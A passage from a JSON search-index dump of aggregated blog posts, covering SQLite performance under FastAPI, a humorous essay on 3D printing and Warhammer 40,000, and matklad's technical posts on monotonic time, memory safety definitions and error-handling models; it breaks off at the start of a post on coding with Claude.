64MB feels right given the kind of data I'm throwing around and how small it is, but this is guess work.\\ntemp_store\\n= write to memory, not disk. Makes sense for speed.\\nHowever my results from load testing sucked.\\nResponse Times (ms):   Min: 678ms   Avg: 4765ms   P50: 5241ms   P95: 5908ms   P99: 6003ms   Max: 6004ms\\nNow this is under heavy load (simulating 1000 active users making a lot of requests at the same time, which is more than I've seen), but still this is pretty bad. The cause of it was, of course, my fault.\\nBlacklist logic\\nMy \"blacklist\" is mostly just sites that publish a ton of dead links. However I had the setup wrong and was making a database query per website to see if it matched the black list. Stupid mistake. Once I fixed that.\\nResponse Times (ms):   Min: 138ms   Avg: 456ms   P50: 246ms   P95: 1159ms   P99: 1288ms   Max: 1316ms\\nGreat! Or at least \"good enough from an unstable home internet connection with some artificial packet loss randomly inserted\".\\nConclusion\\nSo should you use SQLite as the backend database for a FastAPI setup? Well it depends on how many users you are planning on having. Right now I can handle between 1000 and 2000 requests per second if they're mostly reads, which is exponentially more than I will need for years of running the service. If at some point in the future that no longer works, it's thankfully very easy to migrate off of SQLite onto something else. So yeah overall I'm pretty happy with it as a design.</p>"},{"location":"matduggan.com/The%20Year%20of%20the%203D%20Printed%20Miniature%20%28And%20Other%20Lies%20We%20Tell%20Ourselves%29_20260205/","title":"The Year of the 3D Printed Miniature (And Other Lies We Tell Ourselves)\\n\\n\u6765\u6e90: https://matduggan.com\\n\u94fe\u63a5: https://matduggan.com/the-year-of-the-3d-printed-miniature-and-other-lies-we-tell-ourselves/\\n\u65e5\u671f: Mon, 29 Dec 2025 11:19:30 GMT\\n\\n---\\n\\nOne amusing thing about following tech news is how often the tech community makes a bold prediction or assertion, only to ultimately be completely wrong. This isn't amusing in a \"ha ha, we all make mistakes\" kind of way. It's amusing in the way that watching someone confidently stride into a glass door is amusing. You feel bad, but also, they really should have seen that coming.\\nBe it VR headsets that would definitely replace reality by 2018, or self-driving cars in every driveway \"within five years\" (a prediction that has been made every five years since 2012), we have a remarkable talent for making assumptions about what consumers will like and value without having spent a single goddamn minute listening to those same consumers. It's like a restaurant critic reviewing a steakhouse based entirely on the menu font.\\nSo when a friend asked me what I thought about \"insert new revolutionary technology that will change everything\" this week, my brain immediately jumped to \"it'll be like 3D printers and Warhammer.\" This comparison made sense in the moment, as we were currently playing a game of Warhammer 40,000, surrounded by tiny plastic soldiers and the faint musk of regret. But I think, after considering it later, it might make sense for more people as well\u2014a useful exercise in tech enthusiasm versus real user wants and needs.\\nOr, put another way: a cautionary tale about people who have never touched grass telling grass-touchers how grass will work in the future.\\nMiniatures and Printers\\nOne long-held belief among tech bros has been the absolute confidence that 3D printers would, at some point,\\ndisrupt\\n. Exactly what they would disrupt wasn't 100% clear. Disruption, in Silicon Valley parlance, is less a specific outcome and more a vibe\u2014a feeling that something old and profitable will soon be replaced by something new and unprofitable that will somehow make everyone rich. A common example trotted out was one of my favorite hobbies: tabletop wargaming. More specifically, the titan of the industry, Warhammer 40,000.\\nEvery time a new 3D printer startup graced the front page of Hacker News, this proclamation would echo from the comments section like a prophecy from a very boring oracle: \"This will destroy Games Workshop.\" Reader, it has not destroyed Games Workshop. Games Workshop is doing fine. Games Workshop will be selling overpriced plastic crack to emotionally vulnerable adults long after the sun has consumed the Earth.\\nIt doesn't seem like they're dying\\nyet\\nIt's even more dorky in real life\\nFor those who had friends in high school\u2014and I'm not being glib here, this is a genuine demographic distinction\u201440k is a game where two or more players invest roughly $1,000 to build an army of small plastic figures. You then trim excess plastic with a craft knife (cutting yourself at least twice, this is mandatory), prime them, paint them over the course of several months, and then carefully transport them to an LGS (local game shop) in foam-lined cases that cost more than some people's luggage.\\nAnother fellow dork will then play you on a game board roughly the size of a door, covered in fake terrain that someone spent 40 hours making to look like a bombed-out cathedral. You will both have rulebooks with you containing as many pages as the Bible and roughly as open to interpretation. Wars have been started over less contentious texts.\\nTo put 40k in some sort of nerd hierarchy, imagine a game shop. At the ground level of this imaginary shop are Magic: The Gathering and Pok\u00e9mon TCG games. Yes, these things are nerdy, but it's not that deep into the swamp. It's more of a gentle wade. You start with Pok\u00e9mon at age 10, burn your first Tool CD at 14, and then sell your binder of 'mons to fund your Magic habit. This is the natural order of things.\\nDeeper into the depths, maybe only playing at night like creatures who have evolved beyond the need for vitamin D, are your TTRPGs (tabletop RPGs). The titan of the industry is Dungeons &amp; Dragons, but there is always some new hotness nipping at its heels, designed by someone who thought D&amp;D wasn't\\nquite\\ncomplicated enough. TTRPGs are cheap to attempt to disrupt\u2014you basically need \"a book\"\u2014so there are always people trying. These are the folks with thick binders, sacks of fancy dice made from materials that should not be made into dice, and opinions about \"narrative agency.\"\\nNear the bottom, almost always in the literal basement of said shop, are the wargame community. We are the Morlocks of this particular H.G. Wells situation.\\nI, like a lot of people, discovered 40k at a dark time in my life. My college girlfriend had cheated on me, and I had decided to have a complete mental breakdown over this failed relationship that was doomed well before this event. The cheating was less a cause and more a symptom, like finding mold on bread that was already stale. Honestly, in retrospect, hard to blame her. I was being difficult. I was the kind of difficult where your friends start sentences with \"Look, I love you, but...\"\\nLate at night, I happened to be driving my lime green Ford Probe past my local game shop. The Ford Probe, for those unfamiliar, was a car designed by someone who had heard of cars but had never actually seen one. It was the automotive equivalent of a transitional fossil. I loved it the way you love something that confirms your worst suspicions about yourself.\\nThere, through the shop window, I saw people hauling some of the strangest items out of their trunks. Half-destroyed buildings. Thousands of tiny little figures. Giant robots the size of a small cat with skulls for heads. One man was carrying what appeared to be a ruined spaceship made entirely of foam and spite.\\nI pulled over immediately.\\nLook at that handsome monster\\nThe owner, who knew me from playing Magic, seemed neither surprised nor pleased to see me. This was his default state. Running a game shop for 20 years will do that to a person. \"They're in the basement,\" he said, in the mostly dark game shop, the way someone might say \"the body's in the basement\" in a very different kind of establishment.\\nI descended the rickety wooden stairs to a large basement lit by three naked bulbs hanging from cords. The aesthetic was \"serial killer's workspace\" meets \"your uncle's unfinished renovation project.\" It was perfect.\\nBefore me were maybe a dozen tables littered with plastic. Some armies had many bug-like things, chitinous and horrible. Others featured little skeletons or robots. There were tape measures everywhere and people throwing literal handfuls of small six-sided dice at the table with the intensity of gamblers who had nothing left to lose. Arguments broke out over millimeters. Someone was consulting a rulebook with the desperation of a lawyer looking for a loophole.\\nI was hooked immediately.\\n40k is the monster of wargaming specifically because of a few genius decisions by Games Workshop, the creators\u2014a British company that has somehow figured out how to print money by selling plastic and lore about a fascist theocracy in space. It's a remarkable business model.\\nThe game looks more complicated to play than it is.\\nEspecially now, in the 10th edition, the core rules don't take long to learn. However, there is a lot of depth to the individual options available to each army that take a while to master. So it hits that sweet spot of being fast to onboard someone onto while still providing frightening amounts of depth if you're the kind of person who finds \"frightening amounts of depth\" appealing rather than exhausting. I am that kind of person. This explains a lot about my life.\\nThe community is incredible.\\nWhen I moved from Chicago to Denmark, it took me less than three days to find a local 40k game. Same thing when I moved from Michigan to Chicago. The age and popularity of the game means it is a built-in community that follows you basically around the world. Few other properties have this kind of stickiness. It's like being a Deadhead, except instead of following a band, you're following a shared delusion that tiny plastic men matter. They do matter. Shut up.\\nCool miniatures.\\nThey look nice. They're fun to paint and put together. They're complicated without being too annoying. This is the part that 3D printers are supposed to help with.\\nThe Proxy Problem\\nSince the beginning of the game, 40k casual games have allowed proxies. Proxies are stand-ins for specific units that you need for an army but don't have. Why don't you have them? Excellent question. Let me tell you about Games Workshop's relationship with its customers.\\nGames Workshop has always played a lot of games with inventory. Often releases will have limited supply, or there are weird games with not fulfilling the entire order that a game shop might make. Even when they switched from metal to plastic miniatures, the issues persisted. This has been the source of conspiracy theories since the very beginning\u2014whispers of artificial scarcity, of deliberate shortages designed to create FOMO among people who were already deeply susceptible to FOMO because they collect tiny plastic soldiers.\\nWhether the conspiracy theories are true is almost beside the point. The\\nfeeling\\nof scarcity is real, and feelings, as any therapist will tell you, are valid. Even the stupid ones.\\nSo players had proxies. Anything from a Coke can to another unit entirely. Basically, if it had the same size base and roughly the same height, most people would consider it allowable. \"This empty Red Bull can is my Dreadnought.\" Sure. Fine. We've all been there.\\nThis is where I first started to see 3D-printed miniatures enter the scene.\\nSimilar to most early tech products, the first FDM 3D-printed miniatures I saw were horrible. The thick, rough edges and visible layer lines were not really comparable to the professional product, even from arm's length. They looked like someone had described a Space Marine to a printer that was also drunk. But they were totally usable as a proxy and better than a Coke can. The bar, as they say, was low.\\nBut the technology continued to get better and cheaper and, as predicted by tech people, I started to notice more and more interest in 3D printing among people at the game stores. When I first encountered a resin 3D-printed army at the table, I'll admit I was intrigued. This person had basically fabricated $3,000 worth of hard-to-get miniatures out of thin air and spite.\\nThis was supposed to be the big jumping-off point. The inflection moment. There were a lot of discussions at the table about how soon we wouldn't even have game shops with inventory! They'd be banks of 3D printers that we would all effortlessly use to make all the minis we wanted! The future was here, and it smelled like resin fumes!\\n3D Printing Misses\\nPrinting a bunch of miniatures off a resin 3D printer quickly proved to have a lot of cracks in this utopian plan. Even a normal-sized mini took hours to print. That wouldn't be so bad, except these printers couldn't just live anywhere in your apartment. They're not like a Keurig. You can't just put them on your kitchen counter and forget about them.\\nWhen I was invited to watch someone print off minis with a resin 3D printer, it reminded me a lot of the meth labs in my home state of Ohio. And I don't mean that as hyperbole. I mean there were chemicals, ventilation hoods, rubber gloves, and a general atmosphere of \"if something goes wrong here, it's going to go very wrong.\" The guy giving me the tour had safety goggles pushed up on his forehead. He was wearing an apron. At one point, he said the phrase \"you really don't want to get this on your skin\" with the casual tone of someone who had definitely gotten it on his skin.\\nIn practice, the effort to get the STL files, add supports, wash off the models with isopropyl alcohol, remove supports without snapping off tiny arms, and finally cure the mini in UV lights was exponentially more effort than I'm willing to invest. And I say this as someone who has painted individual eyeballs on figures smaller than my thumb. I have a high tolerance for tedious bullshit. This exceeded it.\\nWhy?\\nBefore I start, I first want to say I don't dislike the 3D printing community. I think it's great they're supporting smaller artists. I love that they found a hobby inside of a hobby, like those Russian nesting dolls but for people who were already too deep into something. I will gladly play against their proxy armies any day of the week.\\nBut people\\noutside\\nof the hobby proclaiming that this is the \"future\" are a classic example of how they don't understand why we're doing the activity in the first place. It's like watching someone who has never cooked explain how meal replacement shakes will eliminate restaurants. You're not wrong that it's technically more efficient. You're just missing the entire point of the experience.\\nThe reason why Games Workshop continues to have a great year after year\u2014despite prices that would make a luxury goods executive blush, despite inventory issues, despite a rulebook that changes often enough to require a subscription service\u2014is because of this fundamental misunderstanding.\\nPlayers invest a lot of time and energy into an army. You paint them. You decorate the plastic bases with fake grass and tiny skulls. You learn their specific rules and how to use them. You develop opinions about which units are \"good\" and which are \"trash\" and you will defend these opinions with the fervor of a religious convert. Despite the eternal complaints about the availability of inventory, the practical reality is that most people can only keep a pipeline of one or maybe two armies going at once.\\nThe bottleneck isn't acquiring plastic. The bottleneck is\\neverything else\\n.\\nSo let's do the math on this. You buy a resin 3D printer. All the supplies. You get a spot in your house where you can safely operate it\u2014which means either a garage, a well-ventilated spare room, or a relationship-ending negotiation with whoever you live with. You find or buy all the STLs you need. Let's say they all have supports in the files, so you just need to print them off. Best-case scenario.\\nLet's say we break even around 50-75 infantry and a few larger models. This is over the raw cost of materials, but we need to factor in the space in your house it takes up, plus there's a learning curve with figuring out how to do it. You also need to invest a lot of time getting these files for printing and finding the good ones. For the sake of keeping this simple, let's just assume the actual printing process goes awesome. No failed prints. No supports that fuse to the model. No discovering that your file was corrupted after six hours of printing. Fantasy land.\\nHere's the thing: getting the raw plastic minis is not the time-consuming part.\\nFirst, you need to paint them. I take about two hours to paint each model, and I'm far from the best painter out there. I'm solidly in the \"looks good from three feet away\" category, which is also how I'd describe my general appearance. Vehicles take longer because they're bigger\u2014maybe 10-20 hours for one of those. We're talking somewhere in the ballpark of 150 hours to paint everything that you need to paint for a standard army.\\nNow don't get me wrong, I love painting. But I'm a 38-year-old with a child and a full-time job. Finding 150 hours for anything that isn't work, childcare, or sleep requires the kind of calendar Tetris that would make a project manager weep. It is a massive investment of time to get an army on the table, even if you remove the financial element of buying the minis entirely.\\nFrankly, the money I pay to Games Workshop is the easiest part of the entire process. Often the box will be lovingly stacked on top of other sealed mini boxes\u2014a pile of shame, we call it\u2014until I can start the process of even hoping to catch up. I have boxes I bought during the Obama administration. They're still sealed. They judge me.\\nBut okay, let's say we get them all painted. What's next?\\nNext comes \"learn how the army works.\" There is a ton of flexibility to each army in 40k and how they work and operate. It takes a bit of research and time to figure out what they all do, which is something you are 100% expected to know cover to cover when you show up to play. It's not my job to know what your army can and cannot do. If you show up not knowing your own rules, you will be eaten alive, and you will deserve it.\\nSo what I saw with the 3D printing crowd felt a lot like the \"Year of the Linux Desktop\" crowd. Every year they would proclaim that soon we'd all get on board with their vision. They would print off an incredibly impressive army with all the hard-to-find minis that were sold once at a convention in 1997. They'd get the army \"painted\" to some definition of painted\u2014and I'm using those quotation marks with malice\u2014get on the table, and then play effectively that one army the same as the rest of us.\\nThe printer didn't give them more time. It didn't give them more skill. It just gave them more unpainted plastic, which, brother, I have plenty of already.\\nFor those in the 3D printing crowd who weren't big into playing, just painting, part of the point is showing off your incredible work to everyone else. Except nobody wants to see a 3D-printed forgery of an official model. It's like showing up to a car show with a kit car that looks like a Ferrari. Sure, it's impressive in its own way, but it's not\\nreally\\na Ferrari, and everyone knows it, and now we're all standing around pretending we don't know it, and it's uncomfortable for everyone.\\nOnce someone figured out one of your minis was 3D printed, shops generally wouldn't feature it in their display cases. So there was no reason for people who were going to put in 10+ hours per model to skip paying for the official real models. If you're going to invest that much time, you want the real thing. You want the little Games Workshop logo on the base. You want to be able to say \"yes, I paid $60 for this single figure\" with the quiet dignity of someone who has made peace with their choices.\\n\"Well then the shops can just sell the STLs and do the printing there!\"\\nThis shows me you haven't spent a lot of time in these shops.\\nGame shops need to carry a ton of inventory all the time, and a lot of their sales are impulse purchases. I see a mini I wouldn't typically be interested in, but it's done and ready, and I'm weak, and now I own it. That's the business model. They also operate on relatively thin margins\u2014these aren't Apple Stores, they're labors of love run by people who got into this because they loved games and are now slowly being crushed by commercial rent and distributor minimums.\\nIt's just not feasible for them to print minis on demand and have enough staff to keep an eye on all the printing. Plus, tabletop wargaming isn't their major revenue generator anyway\u2014it's card games like Pok\u00e9mon and Magic. The wargamers in the basement are a bonus, not the main attraction. We're the weird cousins who show up to Thanksgiving and everyone tolerates us because we're family.\\nThe Moral of the Story\\nAt the end of the day, the 3D printing proclamation that it would disrupt my hobby ended up being a whole lot of nothing. A series of reasonable mistakes were made by people enthusiastic about the technology, resulting in the current situation where every year is the year that all of this will get disrupted. Any day now. Just you wait.\\nThey looked at the price of miniatures and saw inefficiency. They looked at the scarcity and saw opportunity. What they didn't see was that the price and the scarcity were almost beside the point. The hobby isn't about acquiring plastic. The hobby is about what you do with the plastic after you acquire it. The hobby is about the 150 hours of painting. The hobby is about the arguments over rules interpretations. The hobby is about descending into a basement lit by three naked bulbs and finding your people.\\nYou can't 3D print that.\\nSo the next time someone tells you that some new technology is going to \"disrupt\" something you love, ask yourself: do they actually understand why people love it? Do they understand the irrational, inefficient, deeply human reasons people engage with this thing? Or are they just looking at a spreadsheet and seeing numbers that don't make sense to them?\\nBecause if it's the latter, you can probably ignore them. They'll be wrong. They're almost always wrong.\\nIn the meantime, you can find me in the basement, losing match after match, surrounded by tiny plastic soldiers I've spent hundreds of hours painting, playing a game that makes no sense to anyone who hasn't given themselves over to it completely.\\nIt's not efficient. It's not optimized. It's not disrupting anything.","text":""},{"location":"matklad.github.io/","title":"matklad.github.io","text":"<p>matklad's Arts&amp;Crafts</p> <p>\u7f51\u7ad9: https://matklad.github.io RSS: https://matklad.github.io/feed.xml</p>"},{"location":"matklad.github.io/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":"<ul> <li>make.ts_20260127</li> <li>Considering Strictly Monotonic Time_20260123</li> <li>Vibecoding #2_20260120</li> <li>Memory Safety Is_20251230</li> <li>The Second Great Error Model Convergence_20251229</li> </ul>"},{"location":"matklad.github.io/Considering%20Strictly%20Monotonic%20Time_20260123/","title":"Considering Strictly Monotonic Time","text":"<p>\u6765\u6e90: https://matklad.github.io \u94fe\u63a5: https://matklad.github.io/2026/01/23/strictly-monotonic-time.html \u65e5\u671f: 2026-01-23T00:00:00+00:00</p>"},{"location":"matklad.github.io/Considering%20Strictly%20Monotonic%20Time_20260123/#considering-strictly-monotonic-time_1","title":"Considering Strictly Monotonic Time","text":"<p>Jan 23, 2026</p> <p>Monotonic time is a frequently used, load bearing abstraction. Monotonicity is often enforced using the following code:</p> <pre><code>fn now(clock: *Clock) Instant {\n    const t_raw = os_time_monotonic();\n\n    const t = @max(t_raw, clock.guard);\n    assert(t &gt;= clock.guard);\n    assert(t &gt;= t_raw);\n\n    clock.guard = t;\n    return t;\n}\n</code></pre> <p>That is, ask the OS about the current monotonic time, but don\u2019t trust the result too much and clamp it using an in-process guard. Under normal scenarios, you can trust the OS promise of monotonicity, but, empirically, there\u2019s a long tail of different scenarios where the promise isn\u2019t upheld: https://github.com/rust-lang/rust/pull/56988</p> <p>Today I realized that, if you are doing the above, you might as well force the time to be strictly monotonic:</p> <pre><code>const t = @max(t_raw, clock.guard + 1ns);\nassert(t &gt; clock.guard);\n</code></pre> <p>The benefit of strict monotonicity is that you can tighten asserts, <code>assert(past &lt;= present)</code> can become <code>assert(past &lt; present)</code> and that additionally catches the bug where you pass in exactly the same instance. In other words, the <code>&lt;=</code> version explicitly allows either query-ing the time again, or using the old value directly.</p> <p>Conversely, with strictly monotonic time, you know that if you see two numerically identical time instances, they must have been ultimately derived from the exact same call to <code>now()</code>. Time becomes fundamentally less ambiguous.</p> <p>The constraint here is that the resolution of the time value (not the clock resolution) needs to be high enough, to make sure that repeated <code>+1</code> don\u2019t move you into the future, but nanosecond precision seems fine for that.</p>"},{"location":"matklad.github.io/Memory%20Safety%20Is_20251230/","title":"Memory Safety Is ...","text":"<p>\u6765\u6e90: https://matklad.github.io \u94fe\u63a5: https://matklad.github.io/2025/12/30/memory-safety-is.html \u65e5\u671f: 2025-12-30T00:00:00+00:00</p>"},{"location":"matklad.github.io/Memory%20Safety%20Is_20251230/#memory-safety-is_1","title":"Memory Safety Is \u2026","text":"<p>Dec 30, 2025</p> <p>Memory safety is one of those elusive concepts like intelligence, consciousness, or porn, that resist attempts to be put to words. Thus, I am not going to attempt to define it. Instead, I want to poke holes in definitions of others.</p> <p>Note that the present post is 90% sophistry in the style of Zeno \u2014 I don\u2019t think you need a water-tight definition to have a reasonable discussion, and no definition can save an unreasonable one. But thinking about definitions focuses the mind.</p> <p>The crux of my argument:</p> <p>Memory safety is a property of an implementation.</p> <p>That\u2019s the problem with many definitions \u2014 they are about a wrong kind of thing, and are confused for that reason. For example, a definition used in Memory Safety for Skeptics:</p> <p>A program execution is memory safe so long as a particular list of bad things, called memory-access errors, never occur:</p> <ul> <li>Buffer overflow </li> <li>Null pointer dereference </li> <li>Use after free </li> <li>Use of uninitialized memory </li> <li>Illegal free (of an already freed pointer, or a non-malloc-ed pointer)  </li> </ul> <p>This is obvious nonsense! Java programs dereference null pointers all the time! And on typical architectures dereferencing a null pointer in user-space is well-defined to trap. Many JVMs implement Java-level NPE checks by relying on OS-level segfaults!</p> <p>Another popular definition comes from Type Systems paper by Luca Cardelli.</p> <p>A program fragment is safe if it does not cause untrapped errors to occur. Languages where all program fragments are safe are called safe languages.</p> <p>This definition is not wrong, but it is vacuous. It is internally consistent, but doesn\u2019t define anything useful.</p> <p>To see that we need to sketch our domain of discourse.</p> <p>We start with a source language, L, such as Java or C. L is defined by its syntax and semantics. Syntax defines the set of programs, and semantics ascribes meaning to them. Semantics is necessarily defined in terms of abstract machine LM \u2014 a mathematical device that captures all the real and \u201cvirtual\u201d state to explain execution behavior of a program. For example, in languages with pointer provenance, provenance is a concrete \u201cfield\u201d of every pointer in the abstract machine.</p> <p>In addition to LM (abstract machine), we also have a concrete machine CM on hand, such as x86_64 running Linux userspace, or Wasm in the browser. Concrete machine comes with its own language C and its own semantics.</p> <p>Finally, we have an implementation I that we use to run L programs on our concrete machine CM. Roughly, if P is an L program, then an implementation transforms it to a C program with a matching semantics:</p> <pre><code>\u2200 P \u2208 L:\n    I(P) \u2208 C\n  \u2227 LSema(P) \u2248 CSema(I(P))\n</code></pre> <p>Concretely, if we have a Java program, we can reason about what this program does without thinking where it will run. It\u2019s a job of the JVM to faithfully preserve our mental model when the program is executed on an aarch64 laptop. See Compcert paper for details.</p> <p>The key detail here is that on the level of abstract semantics, you simply can not have undefined behavior. For the specification to be consistent, you need to explain what the abstract machine does in every case exhaustively, even if it is just \u201cLM gets stuck\u201d. If UB is set complement to defined behaviors, then it is defined just as precisely! Again, Compcert paper defines what UB is on page 15.</p> <p>And this is the problem I have with Cardelli\u2019s definition. It hinges on how we name a particular set in our abstract semantics. If the set is called \u201ctrapped error\u201d the language is safe, but if it is \u201cundefined behavior\u201d, it is unsafe.</p> <p>This is useless! Here, I\u2019ve just made a language called Lil-C, which exactly like C, except that every UB is formally defined to trap. It is safe! And it can run any C program! Have I just done anything useful? No!</p> <p>To recap, we have source language L, target language/machine C, and an implementation I that maps the former to the latter. Any memory safety definition should talk about I. If it talks about L or C, it can\u2019t be right.</p> <p>Consider \u201cdereference of a wild pointer\u201d. At the level of L, it is a well-defined operation that causes abstract machine to get stuck. It\u2019s the job of abstract machine to precisely tell us which pointers are valid to dereference. At the level of C, this operation is also well defined! Physical address is looked up in the page table, protection bits are checked, an interrupt is raised if something\u2019s off, etc. Undefined Behavior and memory unsafety arise in translation of semantics of L into C, where \u201cstuck\u201d L states give raise to \u201cunexpected\u201d behaviors in C, which can not be explained in terms of L.</p> <p>Cardelli\u2019s definition ends up being vacuous, because it tries to talk about L in isolation.</p> <p>\u201cSkeptics\u201d definition is doubly confused. It\u2019s unclear if it has L or C in mind (null pointer dereference in the source code, or in the generated machine code), but it would be wrong in either count, as it definitely doesn\u2019t touch I.</p> <p>As a positive example, consider Fil-C (see also A note on Fil-C). This is an implementation of C that maintains C semantics, is safe, and is arguably sufficiently efficient to be practical. Unlike my Lil-C, Fil-C is a useful thing (and requires much more effort to pull off).</p> <p>I know I promised not to define memory safety here, but, having skimmed that Compcert paper (hat tip to @pervognsen), I think I\u2019ll go out on a limb and just do it? Compcert paper defines backward simulation as a property that every behavior of a compiled program is a behavior of the source program (semantics of a program is a set of behaviors, due to non-determinism). Using this article\u2019s notation:</p> <pre><code>P \u2208 L        -- source program\nI: L -&gt; C    -- implementation (e.g L to C compiler)\nI(P) \u2208 C     -- compiled program\nLSema(P)     -- possible behaviors of P\nCSema(I(P))  -- behaviors of P under implementation I\n\n-- Backward simulation:\n\u2200B: B \u2208 CSema(I(P)) =&gt; B \u2208 LSema(P)\n</code></pre> <p>Memory safety is a weakening of backward simulation:</p> <pre><code>-- Memory safety of implementation I:\nMemorySafe(I) :=\n    \u2200 P: \u2200B: B \u2208 CSema(I(P)) =&gt; (B \u2208 LSema(P) \u22c1 B = crash)\n</code></pre> <p>An implementation I of L is memory safe, if it cannot give rise to new, surprising behaviors, for arbitrary programs P (including buggy ones), except that crashing is allowed. As a smoke test, an implementation that produces programs that always immediately crash is safe according to this definition, as it should be.</p> <p>Thinking about definitions focuses the mind indeed!</p> <p>Update(2025-12-31): Another interesting paper to read is The Meaning Of Memory Safety. I think their definition ends up significantly stronger than needed: closer to CHERI than Java, and deems JavaScript to not be memory safe. Still worth reading!</p>"},{"location":"matklad.github.io/The%20Second%20Great%20Error%20Model%20Convergence_20251229/","title":"The Second Great Error Model Convergence","text":"<p>\u6765\u6e90: https://matklad.github.io \u94fe\u63a5: https://matklad.github.io/2025/12/29/second-error-model-convergence.html \u65e5\u671f: 2025-12-29T00:00:00+00:00</p>"},{"location":"matklad.github.io/The%20Second%20Great%20Error%20Model%20Convergence_20251229/#the-second-great-error-model-convergence_1","title":"The Second Great Error Model Convergence","text":"<p>Dec 29, 2025</p> <p>I feel like this has been said before, more than once, but I want to take a moment to note that most modern languages converged to the error management approach described in Joe Duffy\u2019s The Error Model, which is a generational shift from the previous consensus on exception handling.</p> <p>C++, JavaScript, Python, Java, C# all have roughly equivalent <code>throw</code>, <code>catch</code>, <code>finally</code> constructs with roughly similar runtime semantics and typing rules. Even functional languages like Haskell, OCaml, and Scala feature exceptions prominently in their grammar, even if their usage is frowned upon by parts of the community.</p> <p>But the same can be said about Go, Rust, Swift, and Zig! Their error handling is similar to each other, and quite distinct from the previous bunch, with Kotlin and Dart being notable, ahem, exceptions. Here are some commonalities of modern error handling:</p> <p>First , and most notably, functions that can fail are annotated at the call side. While the old way looked like this:</p> <pre><code>Widget widget = make_widget();\n</code></pre> <p>the new way is</p> <pre><code>let widget = make_widget()?;\n\n\nconst widget = try make_widget();\n\n\nlet widget = try makeWidget()\n\n\nwidget, err := makeWidget()\nif err != nil {\n    return err\n}\n</code></pre> <p>There\u2019s a syntactic marker alerting the reader that a particular operation is fallible, though the verbosity of the marker varies. For the writer, the marker ensures that changing the function contract from infallible to fallible (or vice versa) requires changing not only the function definition itself, but the entire call chain. On the other hand, adding a new error condition to a set of possible errors of a fallible function generally doesn\u2019t require reconsidering rethrowing call-sites.</p> <p>Second , there\u2019s a separate, distinct mechanism that is invoked in case of a detectable bug. In Java, index out of bounds or null pointer dereference (examples of programming errors) use the same language machinery as operational errors. Rust, Go, Swift, and Zig use a separate panic path. In Go and Rust, panics unwind the stack, and they are recoverable via a library function. In Swift and Zig, panic aborts the entire process. Operational error of a lower layer can be classified as a programming error by the layer above, so there\u2019s generally a mechanism to escalate an erroneous result value to a panic. But the opposite is more important: a function which does only \u201cordinary\u201d computations can be buggy, and can fail, but such failures are considered catastrophic and are invisible in the type system, and sufficiently transparent at runtime.</p> <p>Third , results of fallible computation are first-class values, as in Rust\u2019s <code>Result&lt;T, E&gt;</code>. There\u2019s generally little type system machinery dedicated exclusively to errors and <code>try</code> expressions are just a little more than syntax sugar for that little Go spell. This isn\u2019t true for Swift, which does treat errors specially. For example, the generic <code>map</code> function has to explicitly care about errors, and hard-codes the decision to bail early:</p> <pre><code>func map&lt;T, E&gt;(\n    _ transform: (Self.Element) throws(E) -&gt; T\n) throws(E) -&gt; [T] where E : Error\n</code></pre> <p>Swift does provide first-classifier type for errors.</p> <p>Should you want to handle an exception, rather than propagate it, the handling is localized to a single throwing expression to deal with a single specific errors, rather than with any error from a block of statements:</p> <pre><code>let widget = match make_widget() {\n    Ok(it) =&gt; it,\n    Err(WidgetError::NotFound) =&gt; default_widget(),\n};\n\n\nlet widget = make_widget() catch |err| switch (err) {\n    error.NotFound =&gt; default_widget(),\n};\n</code></pre> <p>Swift again sticks to more traditional try catch, but, interestingly, Kotlin does have <code>try</code> expressions.</p> <p>The largest remaining variance is in what the error value looks like. This still feels like a research area. This is a hard problem due to a fundamental tension:</p> <ul> <li>On the one hand, at lower-levels you want to exhaustively enumerate errors to make sure that: <ul> <li>internal error handling logic is complete and doesn\u2019t miss a case, </li> <li>public API doesn\u2019t leak any extra surprise error conditions. </li> </ul> </li> <li>On the other hand, at higher-levels, you want to string together widely different functionality from many separate subsystems without worrying about specific errors, other than: <ul> <li>separating fallible functions from infallible, </li> <li>ensuring that there is some top-level handler to show a 500 error or an equivalent. </li> </ul> </li> </ul> <p>The two extremes are well understood. For exhaustiveness, nothing beats sum types (<code>enum</code>s in Rust). This I think is one of the key pieces which explains why the pendulum seemingly swung back on checked exceptions.</p> <p>In Java, a method can throw one of the several exceptions:</p> <pre><code>void f() throws FooException, BarException;\n</code></pre> <p>Critically, you can\u2019t abstract over this pair. The call chain has to either repeat the two cases, or type-erase them into a superclass, losing information. The former has a nasty side-effect that the entire chain needs updating if a third variant is added. Java-style checked exceptions are sensitive to \u201cN to N + 1\u201d transitions. Modern value-oriented error management is only sensitive to \u201c0 to 1\u201d transition.</p> <p>Still, if I am back to writing Java at any point, I\u2019d be very tempted to standardize on coarse-grained <code>throws Exception</code> signature for all throwing methods. This is exactly the second well understood extreme: there\u2019s a type-erased universal error type, and the \u201cthrowableness\u201d of a function contains one bit of information. We only care if the function can throw, and the error itself can be whatever. You still can downcast dynamic error value handle specific conditions, but the downcasting is not checked by the compiler. That is, downcasting is \u201csave\u201d and nothing will panic in the error handling mechanism itself, but you\u2019ll never be sure if the errors you are handling can actually arise, and whether some errors should be handled, but aren\u2019t.</p> <p>Go and Swift provide first-class universal errors, like Midori. Starting with Swift 4, you can also narrow the type down.</p> <p>Rust doesn\u2019t really have super strong conventions about the errors, but it started with mostly enums, and then <code>failure</code> and <code>anyhow</code> shone spotlight on the universal error type.</p> <p>But overall, it feels like \u201cmidpoint\u201d error handling is poorly served by either extreme. In larger applications, you sorta care about error kinds, and there are usually a few place where it is pretty important to be exhaustive in your handling, but threading necessary types to those few places infects the rest of the codebases, and ultimately leads to \u201ca bag of everything\u201d error types with many \u201cdead\u201d variants.</p> <p>Zig makes an interesting choice of assuming mostly closed-world compilation model, and relying on cross-function inference to learn who can throw what.</p> <p>What I find the most fascinating about the story is the generational aspect. There really was a strong consensus about exceptions, and then an agreement that checked exceptions are a failure, and now, suddenly, we are back to \u201cchecked exceptions\u201d with a twist, in the form of \u201cerrors are values\u201d philosophy. What happened between the lull of the naughts and the past decade industrial PLT renaissance?</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/","title":"Vibecoding #2","text":"<p>\u6765\u6e90: https://matklad.github.io \u94fe\u63a5: https://matklad.github.io/2026/01/20/vibecoding-2.html \u65e5\u671f: 2026-01-20T00:00:00+00:00</p>"},{"location":"matklad.github.io/Vibecoding%20%232_20260120/#vibecoding-2_1","title":"Vibecoding #2","text":"<p>Jan 20, 2026</p> <p>I feel like I got substantial value out of Claude today, and want to document it. I am at the tail end of AI adoption, so I don\u2019t expect to say anything particularly useful or novel. However, I am constantly 